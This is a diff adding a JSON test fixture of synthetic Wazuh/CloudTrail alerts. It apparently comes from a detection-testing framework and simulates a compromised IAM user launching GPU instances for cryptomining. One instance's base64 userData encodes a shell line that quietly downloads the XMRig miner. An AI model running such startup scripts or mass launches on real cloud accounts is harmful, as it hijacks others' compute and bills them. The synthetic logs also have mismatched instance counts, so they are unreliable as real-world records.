@@ -1,0 +1,184 @@
+{
+  "_metadata": {
+    "attack_id": "T1496.004",
+    "variation": "001",
+    "name": "Cloud Service Hijacking - EC2 Cryptomining Instances",
+    "description": "Attacker spins up multiple high-compute EC2 instances for cryptocurrency mining",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "impact",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "CloudTrail - Multiple high-compute instances launched",
+      "sequence": 1,
+      "timestamp": "2026-02-08T19:00:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T19:00:00.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "AWS CloudTrail - Multiple High-Compute Instances Launched",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1496.004"
+            ],
+            "tactic": [
+              "Impact"
+            ],
+            "technique": [
+              "Cloud Service Hijacking"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "aws",
+            "cloudtrail",
+            "ec2"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300040",
+        "decoder": {
+          "name": "aws-cloudtrail"
+        },
+        "location": "CloudTrail",
+        "data": {
+          "aws": {
+            "eventSource": "ec2.amazonaws.com",
+            "eventName": "RunInstances",
+            "eventTime": "2026-02-08T19:00:00Z",
+            "awsRegion": "us-east-1",
+            "sourceIPAddress": "198.51.100.110",
+            "userIdentity": {
+              "type": "IAMUser",
+              "userName": "compromised-dev",
+              "arn": "arn:aws:iam::123456789012:user/compromised-dev"
+            },
+            "requestParameters": {
+              "instanceType": "p3.16xlarge",
+              "minCount": 10,
+              "maxCount": 10,
+              "imageId": "ami-0abcdef1234567890",
+              "userData": "IyEvYmluL2Jhc2gKd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvLi4uCg=="
+            },
+            "responseElements": {
+              "instancesSet": {
+                "items": [
+                  {
+                    "instanceId": "i-0a1b2c3d4e5f67890"
+                  },
+                  {
+                    "instanceId": "i-0b2c3d4e5f6789012"
+                  },
+                  {
+                    "instanceId": "i-0c3d4e5f678901234"
+                  },
+                  {
+                    "instanceId": "i-0d4e5f6789012345a"
+                  },
+                  {
+                    "instanceId": "i-0e5f67890123456bc"
+                  }
+                ]
+              }
+            },
+            "requestID": "E1F2A3B4C5D6E7F8"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-impact",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1496.004",
+        "_fomorian_expected_detection": "Sigma: Multiple High-Compute Cloud Instances Launched (T1496.004)"
+      }
+    },
+    {
+      "_comment": "CloudTrail - Instances launched in unusual region",
+      "sequence": 2,
+      "timestamp": "2026-02-08T19:01:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T19:01:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "AWS CloudTrail - EC2 Instance Launched in Unusual Region",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1496.004"
+            ],
+            "tactic": [
+              "Impact"
+            ],
+            "technique": [
+              "Cloud Service Hijacking"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "aws",
+            "cloudtrail",
+            "ec2"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300041",
+        "decoder": {
+          "name": "aws-cloudtrail"
+        },
+        "location": "CloudTrail",
+        "data": {
+          "aws": {
+            "eventSource": "ec2.amazonaws.com",
+            "eventName": "RunInstances",
+            "eventTime": "2026-02-08T19:01:00Z",
+            "awsRegion": "ap-southeast-1",
+            "sourceIPAddress": "198.51.100.110",
+            "userIdentity": {
+              "type": "IAMUser",
+              "userName": "compromised-dev",
+              "arn": "arn:aws:iam::123456789012:user/compromised-dev"
+            },
+            "requestParameters": {
+              "instanceType": "g4dn.12xlarge",
+              "minCount": 5,
+              "maxCount": 5,
+              "imageId": "ami-0fedcba9876543210"
+            },
+            "responseElements": {
+              "instancesSet": {
+                "items": [
+                  {
+                    "instanceId": "i-1a2b3c4d5e6f78901"
+                  },
+                  {
+                    "instanceId": "i-2b3c4d5e6f7890123"
+                  }
+                ]
+              }
+            },
+            "requestID": "A9B8C7D6E5F4A3B2"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-impact",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1496.004",
+        "_fomorian_expected_detection": "Sigma: Cloud Resources Created in Unusual Region (T1496.004)"
+      }
+    }
+  ]
+}
